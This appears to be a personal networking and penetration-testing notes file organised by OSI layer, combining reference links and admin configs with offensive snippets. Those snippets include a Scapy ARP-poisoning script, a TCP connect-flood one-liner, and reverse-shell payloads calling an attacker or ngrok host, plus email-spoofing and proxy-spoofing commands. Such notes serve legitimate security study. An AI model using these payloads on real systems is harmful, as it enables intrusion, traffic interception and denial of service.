## Documentation

- https://www.iana.org/ # IP & DNS ref
- https://www.icann.org/
- https://www.gsma.com/ # GSM ref
- https://datatracker.ietf.org/ # RFC for every protocols
- https://blog.cloudflare.com/
- https://en.wikipedia.org/wiki/OSI_model
- https://en.wikipedia.org/wiki/RIPE
- https://github.com/biero-el-corridor/OT_ICS_ressource_list # Industrial Protocols
- https://heystacks.com/doc/401/attacking-secondary-contexts-in-web-applications
- https://cyber.gouv.fr/publications/recommandations-relatives-aux-architectures-des-services-dns
- https://cyber.gouv.fr/publications/recommandations-relatives-linterconnexion-dun-si-internet

### Cheatsheet

- https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
- https://github.com/frostbits-security/MITM-cheatsheet/
- https://github.com/antlarac/Wi-Fi-Pentesting-Cheatsheet/

### Forum

- https://lafibre.info/
- https://servethehome.com/
- https://wiki.mesh-idf.fr/fr/home


### Courses & Tutos

- https://www.frameip.com/
- https://how-did-i-get-here.net/
- https://beej.us/guide/bgnet0/html/split/
- https://www.it-connect.fr/cours-it-gratuits/
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/
- https://openclassrooms.com/fr/courses/2340511-maitrisez-vos-applications-et-reseaux-tcp-ip
- https://greatscottgadgets.com/sdr/

## Captures / Challenges

- https://wifichallengelab.com/
- https://wiki.wireshark.org/SampleCaptures
- https://www.wireshark.org/docs/man-pages/tshark.html
- https://tshark.dev/analyze/packet_hunting/packet_hunting/ (memo)
- https://packetlife.net/blog/2009/jul/13/quick-packet-capture-data-extraction/
- https://pwn.college/intro-to-cybersecurity/intercepting-communication/

```bash
# listening
sudo tcpdump -n -i any udp port 5555
ss -tunlpa

# basic traffic capture
sudo tcpdump -l -n -i wlan0

# basic pcap parsing
# filtering protocols -Y "ip.addr == 127.0.0.1 && icmp.type==8"
tshark -2 -r chall.pcap -T fields -e data
tshark -2 -r chall.pcap -Y "icmp.type==8" -t ad
```

## Tools

- [Alfa antennas - dongle USB](https://www.alfa.com.tw/)
- [Bettercap](https://www.bettercap.org/installation/)
- [Curl - devhints.io](https://devhints.io/curl), [protocols - curl.dev](https://everything.curl.dev/protocols/curl.html)
- [Eaphammer](https://github.com/s0lst1c3/eaphammer)
- [GNURadio](https://wiki.gnuradio.org/index.php/Main_Page)
- [GQRX](https://github.com/gqrx-sdr/gqrx)
- [Hex Packet Decoder](https://www.gasmi.net/hpd/)
- [Hping3](https://thelinuxcode.com/hping3/)
- [Impacket](https://github.com/fortra/impacket)
- [Impacket Usage: Active directory protocols](../windows/active_directory)
- [NetworkManager](https://networkmanager.dev/)
- [Ngrok](https://ngrok.com/)
- [Revshells](https://revshells.com)
- [Scapy](https://scapy.readthedocs.io/), [classical attacks](https://scapy.readthedocs.io/en/latest/usage.html#classical-attacks)
- [Tshark](https://tshark.dev/)
- [Wifite2](https://github.com/kimocoder/wifite2)


### BGP (Monitoring RIPE)

- https://sentinelle-routage.fr/

## Protocols & Topology

- https://wiki.wireshark.org/MTU
- https://en.wikipedia.org/wiki/Protocol_data_unit
- https://en.wikipedia.org/wiki/Network_topology


## Physical (L1)

- [NFC, BLE (RF); 802.11x (Wifi) - ./wireless](./wireless)
- https://en.wikipedia.org/wiki/Ethernet
- https://en.wikipedia.org/wiki/InfiniBand

## Data (L2)

### Ethernet

- https://scapy.readthedocs.io/en/latest/routing.html#get-the-mac-of-an-interface
- https://scapy.readthedocs.io/en/latest/usage.html#sending-packets

```python
from scapy.all import *

src_mac = get_if_hwaddr(conf.iface) # ip -br link
dst_mac = "aa:bb:cc:dd:ee:ff" # ping <ip> && arp -a

pkt = Ether(src=src_mac,dst=dst_mac)

pkt.show()
sendp(pkt,conf.iface) #Layer2
```


### ARP

- https://kognise.dev/writing/arp
- https://en.wikipedia.org/wiki/Address_Resolution_Protocol
- https://scapy.readthedocs.io/en/latest/usage.html#arp-mitm
- https://web.archive.org/web/20120720120549/http://www.ghostsinthestack.org/article-20-man-in-the-middle.html

```bash
arp-scan wlan0
```

```py
from scapy.all import *
import time

iface = conf.iface
your_mac = get_if_hwaddr(iface)

pkt = Ether(dst=getmacbyip(server_ip))/ARP(
    op=2,
    psrc=client_ip,
    pdst=server_ip,
    hwsrc=your_mac,
    hwdst=getmacbyip(server_ip)
)

pkt2 = Ether(dst=getmacbyip(client_ip))/ARP(
    op=2,
    psrc=server_ip,
    pdst=client_ip,
    hwsrc=your_mac,
    hwdst=getmacbyip(client_ip)
)

while(True):
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(0.5)
    sendp(pkt2, iface=iface, verbose=False)
    time.sleep(0.5)
```

[sniff.py](./sniff.py)

#### VLAN

- https://en.wikipedia.org/wiki/VLAN
- https://blog.bwlryq.net/fr/posts/vlan_hopping/
- https://scapy.readthedocs.io/en/latest/usage.html#arp-cache-poisoning


## Network (L3)

### ICMP

- https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol
- https://www.iana.org/assignments/icmpv6-parameters/icmpv6-parameters.xhtml

#### MTU

- https://en.wikipedia.org/wiki/Maximum_transmission_unit
- https://en.wikipedia.org/wiki/Path_MTU_Discovery
- https://blog.cloudflare.com/path-mtu-discovery-in-practice/
- https://oneuptime.com/blog/post/2026-03-20-path-mtu-discovery-icmp/view

```bash
# discover MTU
ping -M do -s 1472 <host>
tracepath <host>
```

### IP

- https://en.wikipedia.org/wiki/Internet_protocol_suite
- https://en.wikipedia.org/wiki/Internet_Protocol
- https://en.wikipedia.org/wiki/Private_network
- https://en.wikipedia.org/wiki/IP_routing
- https://en.wikipedia.org/wiki/Time_to_live
- https://scapy.readthedocs.io/en/latest/usage.html#sending-packets
- https://access.redhat.com/sites/default/files/attachments/rh_ip_command_cheatsheet_1214_jcs_print.pdf

```bash
# ip / mac association
ip -br a
ip -br link

# bind locally
ip addr add 10.0.0.4/24 dev eth0
```

#### MTU

- https://en.wikipedia.org/wiki/IP_fragmentation
- https://en.wikipedia.org/wiki/Maximum_transmission_unit
- https://wiki.linuxfoundation.org/networking/iproute2

```bash
# change MTU
sudo ip link set dev eth0 mtu 1400
ip link show eth0 | grep mtu
```

#### Nat

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/reprenons-du-service/nat/

#### Subnetting

`Memo: masque=subnet+host`

- https://jodies.de/ipcalc
- https://www.calculator.net/ip-subnet-calculator.html
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/veuillez-vous-identifier-pour-communiquer/le-subnetting-en-pratique/

```
Goal: split 10.1.1.0/24 into 3 subnets, the 1st needing >= 40 usable hosts

- /24 -> 24 network bits, mask 255.255.255.0, 8 host bits available in this /24
- need h host bits such that 2^h - 2 (network + broadcast reserved) >= 40:
    h=5 -> 2^5-2 = 30 hosts (not enough)
    h=6 -> 2^6-2 = 62 hosts (enough) -> borrow 2 bits from the host part: 24+2 = /26
- new mask: /26 = 255.255.255.192 (128+64 set in the last octet)
- subnet size = 2^6 = 64 addresses -> each subnet's network address increments by 64
```

```
1st: 10.1.1.0/26    (10.1.1.1   - 10.1.1.62  usable, 62 hosts)
2nd: 10.1.1.64/26   (10.1.1.65  - 10.1.1.126 usable)
3rd: 10.1.1.128/26  (10.1.1.129 - 10.1.1.190 usable)
```

#### IPsec

- https://en.wikipedia.org/wiki/IPsec
- https://en.wikipedia.org/wiki/Internet_Key_Exchange
- https://github.com/royhills/ike-scan

#### VPNs

- https://wiki.archlinux.org/title/VPN_over_SSH
- https://github.com/angristan/wireguard-install
- https://github.com/angristan/openvpn-install
- https://en.wikipedia.org/wiki/Maximum_segment_size

### IPv6

- https://en.wikipedia.org/wiki/IPv6
- https://en.wikipedia.org/wiki/IPv6_address
- https://en.wikipedia.org/wiki/Neighbor_Discovery_Protocol

ARP doesn't exist in IPv6 - **NDP** (Neighbor Discovery Protocol, runs over ICMPv6) replaces it: Neighbor Solicitation/Advertisement ~ ARP request/reply, plus Router Solicitation/Advertisement for gateway + prefix discovery (no more L3 broadcast, NDP uses multicast).

Address autoconfiguration: **SLAAC** (stateless, host derives its own address from the router-advertised prefix + interface ID) vs. **DHCPv6** (stateful, server-assigned like DHCPv4).

```bash
ip -6 addr
ip -6 route
ip -6 neigh          # NDP neighbor cache ~ ARP cache
ping -6 <host>       # or: ping6 <host>
```


## Transport (L4)

### TCP

- https://en.wikipedia.org/wiki/Transmission_Control_Protocol
- https://www.geeksforgeeks.org/computer-networks/tcp-ip-model/
- https://0x25.github.io/2021/09/09/Patch-TCP-packets-on-the-fly/
- https://undercodetesting.com/manually-performing-the-tcp-three-way-handshake-with-scapy/
- https://web.archive.org/web/20120720121725/http://www.ghostsinthestack.org/article-10-lidle-host-scan.html

#### RTT

- https://en.wikipedia.org/wiki/Round-trip_delay

#### Sockets

- https://realpython.com/python-sockets/
- https://en.wikipedia.org/wiki/Network_socket
- https://maxnilz.com/docs/004-network/001-tcp-connection-est/
- https://scapy.readthedocs.io/en/latest/usage.html#stacking-layers

```py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
```

```py
from scapy.all import *

pkt = IP(dst="10.0.0.4")/TCP(dport=65535)
pkt.show2()   # better than show(): computes lengths/checksums
send(pkt)
```

#### Denial of Service

- [Hping3](https://thelinuxcode.com/hping3/)
- https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/

`while true; do   exec 3<>/dev/tcp/ip/port;   exec 3<&-; done`

#### Firewall 

[../ctf](../ctf)

- https://linuxize.com/cheatsheet/iptables/
- https://github.com/trimstray/iptables-essentials
- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/apprenons-a-securiser-un-reseau/allumez-le-pare-feu/
- https://docs.suricata.io/en/suricata-6.0.0/rules/intro.html

```bash
# Check rules
iptables -L -n --line-numbers

# Allow SSH from 5.6.7.8
iptables -A INPUT -p tcp --dport 22 -s 5.6.7.8 -j ACCEPT

# Block SSH from 1.2.3.4
iptables -A INPUT -p tcp --dport 22 -s 1.2.3.4 -j DROP
```

**nftables** is the default backend on Debian 10+/RHEL 8+/most current distros (`iptables` above still works there via the `iptables-nft` compat layer, but new rulesets are written directly in `nft`):

- https://wiki.nftables.org/wiki-nftables/index.php/Main_Page

```bash
nft list ruleset

# equivalent to the two iptables rules above (assumes an existing inet filter/input chain)
nft add rule inet filter input tcp dport 22 ip saddr 5.6.7.8 accept
nft add rule inet filter input tcp dport 22 ip saddr 1.2.3.4 drop
```

#### Port Knocking

- https://en.wikipedia.org/wiki/Port_knocking
- https://github.com/jvinet/knock
- https://goteleport.com/blog/ssh-port-knocking/

```bash
# port knocking for default ssh port , for any new packet:
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# accept only if packets go in GATE1 then GATE2
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 7000 -m recent --set --name GATE1 -j DROP
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8000 -m recent --rcheck --seconds 10 --name GATE1 -m recent --set --name GATE2 -j DROP
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -m recent --rcheck --seconds 30 --name GATE2 -j ACCEPT

# if any packet does not satisfy those conditions
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j DROP
```

```bash
for port in 7000, 8000, 22; do nc -w 1 -v server $port; sleep 1; done
```

#### Reverse shell

- https://www.revshells.com/
- https://github.com/0xfalafel/rcat
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
# Most generic payload on victim's side
busybox nc <ip> <port> -e sh
```

*Private network*

`Using tun0 interface (ex OpenVPN)`

```bash
# Attacker
rlwrap nc -nlpv 4444
```

```bash
# Victim
sh -i >& /dev/tcp/<ip tun0>/4444 0>&1
```

*Public network*

- https://web.archive.org/web/20250424195428/ttps://cheatsheet.haax.fr/shells-methods/reverse/

```bash
#term1
ngrok config add-authtoken TOKEN
ngrok tcp 4444

#Forwarding                    tcp://5.tcp.eu.ngrok.io:16833 -> localhost:4444


#term2
rlwrap nc -nlvp 4444
```

```bash
# Victim
sh -i >& /dev/tcp/5.tcp.eu.ngrok.io/16833 0>&1
```

### Reverse Proxy - Ip Spoofing

```bash
ngrok tcp 4444
rlwrap nc -nlvp 4444
```

**Nginx**

```bash
sudo apt install nginx
```

```bash
sudo vim etc/nginx/sites-available/default
```

```
server {
   ...
         # remplacer location /
	location / {
                proxy_pass http://vulnerable-site.org ; 
                proxy_set_header X-Forwarded-For $remote_addr ;
	}
   ...
}
```

```bash
sudo systemctl restart nginx
firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulnerable-site.org/page
```

### UDP

- https://en.wikipedia.org/wiki/User_Datagram_Protocol
- https://blog.cloudflare.com/everything-you-ever-wanted-to-know-about-udp-sockets-but-were-afraid-to-ask-part-1/
- [Bind9 DNS cache poisoning - predictable UDP port](https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)


## Session (L5)

### Named pipes

- https://en.wikipedia.org/wiki/Named_pipe
- https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html
- https://learn.microsoft.com/en-us/windows/win32/ipc/interprocess-communications

### SOCKS 

- https://en.wikipedia.org/wiki/SOCKS
- http://michalszalkowski.com/security/pivoting-tunneling-port-forwarding/chisel-socks5-tunneling-windows-rev/

## Presentation (L6)

### ASN1

- https://en.wikipedia.org/wiki/ASN.1
- [ASN.1 PEM/DER Decoder](https://lapo.it/asn1js/)

### MIME

- https://en.wikipedia.org/wiki/MIME

### SSL / TLS

- https://ctl.shodan.io/
- https://www.ssllabs.com/ssltest/
- https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work
- https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/ # HeartBleed CVE explanation


```bash
openssl s_client -connect 127.0.0.1:8002

curl -s https://google.com -w "%{certs}\n" -o /dev/null 
```

## Application (L7)

- https://en.wikipedia.org/wiki/List_of_URI_schemes
- https://en.wikipedia.org/wiki/Category:Application_layer_protocols


### DNS

- https://en.wikipedia.org/wiki/Domain_Name_System
- https://en.wikipedia.org/wiki/ICANN
- https://www.iana.org/domains/root/files
- https://www.nslookup.io/learning/
- https://www.cloudflare.com/learning/dns/what-is-dns/
- https://www.cloudflare.com/learning/dns/dns-records/
- https://www.noip.com/ # Free DNS
- [Bind9 DNS cache poisoning - predictable UDP port](https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)

![](https://zestedesavoir.com/media/galleries/5382/216c35dd-ebdd-4c15-adb1-8fbd55aa096f.png)

```txt
# Records
A       IPv4
AAAA    IPv6
CNAME   Alias
MX      Mail server
NS      Authoritative name server
PTR     Reverse lookup
TXT     Arbitrary text (SPF, DKIM...)
SRV     Service discovery
SOA     Zone information
CAA     Certificate Authorities allowed
```

**Queries**

```bash
# query from dns @server
dig @1.1.1.1 google.com

# query records
dig <record> <host>
host -t <record> <host>

dig MX google.com #smtp.google.com
dig NS google.com #ns4/ns3/ns2/ns1.google.com
dig SOA google.com #ns1.google.com,dns-admin.google.com
dig TXT google.com

# using host
host -t TXT google.com

# using curl
curl -sH "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=google.com&type=TXT" | jq
```

**Zone transfer**

```bash
dig axfr @IP (sub)_domain_name
#@server/routeur subdomain

host -t axfr zonetransfer.me nsztm1.digi.ninja.
```

**Running an authoritative server (BIND9)**

- https://bind9.readthedocs.io/en/latest/ # official Administrator Reference Manual
- https://en.wikipedia.org/wiki/BIND
- https://linux.die.net/man/5/named.conf
- https://wiki.samba.org/index.php/7.1.1_named.conf
- https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/5/html/deployment_guide/s1-bind-namedconf

`named.conf` (Debian/Ubuntu: `/etc/bind/named.conf*`) splits into an `options {}` block (server-wide behaviour) and one `zone {}` block per zone served. Note `allow-transfer` below - it's exactly what the AXFR attack above relies on being misconfigured to `any`:

```conf
// /etc/bind/named.conf.options - authoritative server, not an open resolver
options {
    directory "/var/cache/bind";
    recursion no;                  // don't answer recursive queries for zones you don't own
    allow-query { any; };
    allow-transfer { 10.0.0.2; };  // restrict AXFR to known secondaries (see Zone transfer above)
};
```

```conf
// /etc/bind/named.conf.local
zone "example.com" {
    type master;                   // "primary" in current BIND terminology
    file "/etc/bind/db.example.com";
};
```

```dns
; /etc/bind/db.example.com - minimal zone file
$TTL 3600
@   IN  SOA ns1.example.com. admin.example.com. ( 2026071200 3600 900 604800 3600 )
@   IN  NS  ns1.example.com.
@   IN  A   10.0.0.1
ns1 IN  A   10.0.0.1
www IN  A   10.0.0.1
```

A secondary/slave points at the primary and replicates via the same zone-transfer mechanism shown above, but authenticated (`masters {}` + optionally TSIG keys) instead of open to anyone:

```conf
zone "example.com" {
    type slave;
    file "/var/cache/bind/db.example.com";
    masters { 10.0.0.1; };
};
```

- `named-checkconf` / `named-checkzone example.com db.example.com` to validate before reloading

**Reverse lookup**

```bash
# Reverse DNS lookup
dig -x 1.2.3.4 # 4.3.2.1.in-addr.arpa.          IN      PTR
dig PTR 4.3.2.1.in-addr.arpa


dig +short flaws.cloud
dig +short PTR 51.243.92.52.in-addr.arpa
dig +short -x 52.92.249.179

# using nslookup
nslookup flaws.cloud
nslookup 52.92.249.179


# all records , DNSSEC, RIPE
whois google.com
```

### VHOST

- https://en.wikipedia.org/wiki/Hosts_(file)
- https://en.wikipedia.org/wiki/Resolv.conf
- https://en.wikipedia.org/wiki/Virtual_hosting
- https://httpd.apache.org/docs/current/vhosts/examples.html

```bash
# avoid updating /etc/hosts bypassing dns cache
curl https://app.example.com --resolve app.example.com:443:20.20.20.20
```

#### DNSCrypt & DNSSEC

- https://github.com/DNSCrypt/dnscrypt-proxy/wiki/Installation-linux
- https://security.stackexchange.com/questions/122547/is-there-a-point-to-dnscrypt-when-using-vpn
- https://github.com/DNSCrypt/dnscrypt-proxy/issues/519

**1.1.1.1**

- https://security.stackexchange.com/questions/238871/will-1-1-1-1-hide-my-traffic-from-my-landlords-router
- https://www.reddit.com/r/CloudFlare/comments/15inies/difference_between_1111_and_warp/

ou

```bash
sudo pacman -S dnsproxy
sudo rm -f /etc/resolv.c*
sudo nano /etc/resolv.conf
#nameserver 127.0.0.1
#options edns0

sudo dnscrypt-proxy -service install
sudo dnscrypt-proxy -service start
dnscrypt-proxy -config /etc/dnscrypt-proxy/dnscrypt-proxy.toml -resolve example.com
```

- https://lig-membres.imag.fr/sicard/tpRES/DNSRICM2-TP.pdf
- https://digi.ninja/projects/zonetransferme.php

#### DNS Rebinding

- https://nip.io/ 
- https://github.com/mpgn/ByP-SOP
- https://lock.cmpxchg8b.com/rebinder.html


### DHCP

- https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol
- https://linux.die.net/man/5/dhcpd.conf
- https://kea.readthedocs.io/en/latest/ # ISC Kea - current ISC DHCP server ([isc-dhcp-server/dhcpd is EOL since end of 2022](https://www.isc.org/blogs/isc-dhcp-eol/), still common in the wild/labs/CTFs but no longer maintained)

**DORA handshake**: `DHCPDISCOVER` (client broadcast) -> `DHCPOFFER` (server) -> `DHCPREQUEST` (client re-broadcasts its chosen offer, so any other server sees it was declined) -> `DHCPACK`.

```conf
# /etc/dhcp/dhcpd.conf - legacy isc-dhcp-server syntax, still what you'll see in most labs/CTFs
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.100 10.0.0.200;
    option routers 10.0.0.1;
    option domain-name-servers 10.0.0.1;
    default-lease-time 600;
    max-lease-time 7200;
}
```

**Attacks**

- DHCP starvation: exhaust the server's address pool with spoofed `DHCPDISCOVER`s (tools: `yersinia`, [`dhcpstarv`](https://github.com/kravietz/dhcpstarv)) to force new clients onto a rogue server.
- Rogue DHCP server: race the legit server to answer `DHCPDISCOVER` first, handing out attacker-controlled `option routers`/`option domain-name-servers` (== MITM/DNS control). Mitigation: DHCP snooping on switches (trusted vs. untrusted ports).
- DHCP relay (`giaddr`, option 82): forwards client broadcasts across subnets to a central server - can leak internal topology if not filtered at the edge.

- https://github.com/DanMcInerney/dhcpwn

### RADIUS / 802.1X

- https://en.wikipedia.org/wiki/RADIUS
- https://en.wikipedia.org/wiki/IEEE_802.1X
- [Wireless WPA-Enterprise](./wireless) - 802.1X is what backs WPA-Enterprise's per-user authentication
- [Windows AD - NPS](../windows/active_directory) - AD environments commonly run RADIUS via Network Policy Server


### FTP

- https://fr.wikipedia.org/wiki/File_Transfer_Protocol
- https://filezilla-project.org/

```bash
mkdir secret; cd secret
python -m pyftpdlib -D
ngrok tcp 2121
```

#### TFTP

- https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol
- https://datatracker.ietf.org/doc/html/rfc1350

No authentication, no encryption, by design - used for PXE network boot and still common on routers/switches/printers/[OT-ICS gear](https://github.com/biero-el-corridor/OT_ICS_ressource_list). Read/write access to any file the server process can reach.

```bash
tftp <ip>
> get config.bin
> put payload.bin
```

### HTTP

- [Curl Options & POST - Gist](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58)
- https://en.wikipedia.org/wiki/HTTP
- https://en.wikipedia.org/wiki/HTTP/2

```bash
mkdir secret; cd secret
ngrok tcp 4444

python -m http.server 4444
```

```bash
## network issues tricks
# retry until up
curl --retry 100 --retry-connrefused --retry-delay 1  http://localhost:4444

# parallel downloads

curl -O https://nbg1-speed.hetzner.com/100MB.bin -O https://nbg1-speed.hetzner.com/1G.bin -Z

# allow to resume downloads
curl -C - -O https://nbg1-speed.hetzner.com/100MB.bin
```

#### HTTPS

- https://en.wikipedia.org/wiki/HTTPS
- https://en.wikipedia.org/wiki/Transport_Layer_Security

```bash
# create an SSL cert and key
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

```python
# serve using our cert
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)

# Create SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

# Wrap the socket with the context
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

httpd.serve_forever()
```

#### HTTP3 / quick

- https://http3-explained.haxx.se/
- https://en.wikipedia.org/wiki/QUIC
- https://github.com/francoismichel/ssh3


### LDAP

- https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html
- https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol

#### Tools

- https://www.openldap.org/
- https://github.com/franc-pentest/ldeep
- https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html
- https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command

### MQTT

- https://en.wikipedia.org/wiki/MQTT
- https://www.hivemq.com/blog/mqtt-essentials-part-1-introducing-mqtt/

### NFS

- https://en.wikipedia.org/wiki/Network_File_System
- https://docs.redhat.com/fr/documentation/red_hat_enterprise_linux/6/html/storage_administration_guide/s2-nfs-nfs-firewall-config

### NTP

- https://en.wikipedia.org/wiki/Network_Time_Protocol
- https://datatracker.ietf.org/doc/html/rfc5905

```bash
ntpq -p            # query configured peers: offset, jitter, stratum
ntpdate -q <server>
```

**NTP amplification DDoS**: `monlist` (legacy `ntpd` command, returns a huge response for a tiny spoofed-source UDP query - classic reflection/amplification) - disabled by default in modern `ntpd`/`chrony`, but the pattern is the same one behind the [Denial of Service](#denial-of-service) section above.

### SMTP

- https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol
- see also POP/IMAP below (retrieval) vs. SMTP (submission/relay)
- [smtp_freeserver.py](./smtp_freeserver.py) - local script
- [CR_TP7_services-resaux-mail.docx](./CR_TP7_services-resaux-mail.docx) - local notes

**SPF/DKIM/DMARC** (anti-spoofing, published as `TXT` records - see the DNS records table above):

- **SPF**: which hosts/IPs may send mail *as* this domain (`v=spf1 include:_spf.google.com ~all`)
- **DKIM**: cryptographic signature over the message, verified against a public key published in DNS
- **DMARC**: policy for SPF/DKIM failures (`none`/`quarantine`/`reject`) + aggregate reporting

```bash
swaks --to victim@example.com --from spoofed@example.com --server mail.example.com
```

- [swaks](https://github.com/jetmore/swaks) - SMTP testing/spoofing tool

### POP/IMAP

- https://support.mozilla.org/en-US/kb/blocking-sender
- https://elsicarius.fr/les-adresses-email-vous-connaissez

### SMB

- https://en.wikipedia.org/wiki/Server_message_block
- https://github.com/ShawnDEvans/smbmap
- https://www.samba.org/samba/docs/current/man-html/smbclient.1.html

### SNMP

- https://www.0x0ff.info/2013/snmpv3-des-cryptool/
- https://en.wikipedia.org/wiki/Net-SNMP
- https://github.com/net-snmp/net-snmp

### SSDP

- https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol
- https://shufflingbytes.com/posts/upnproxychain-a-tool-to-exploit-devices-vulnerable-to-upnproxy/

### SSH

- https://michalszalkowski.com/pivoting-tunneling-port-forwarding/ssh-local-port-forwarding/

### XMPP

- https://en.wikipedia.org/wiki/XMPP
- https://wiki.xmpp.org/web/SASL_Authentication_and_SCRAM

### VoIP

- https://www.eventhelix.com/ims/
- https://www.eventhelix.com/telecom/
- https://en.wikipedia.org/wiki/IP_PBX

#### SIP

- https://en.wikipedia.org/wiki/Session_Initiation_Protocol # ~HTTP for phones
- https://github.com/miconda/sip-resources                  # tools (linphone, sipvicious)
- https://sourceforge.net/projects/openbts/
- https://www.commentcamarche.net/telecharger/communication/24399-x-lite/

![sip](./images/maps-sip-web-architecture.jpg)
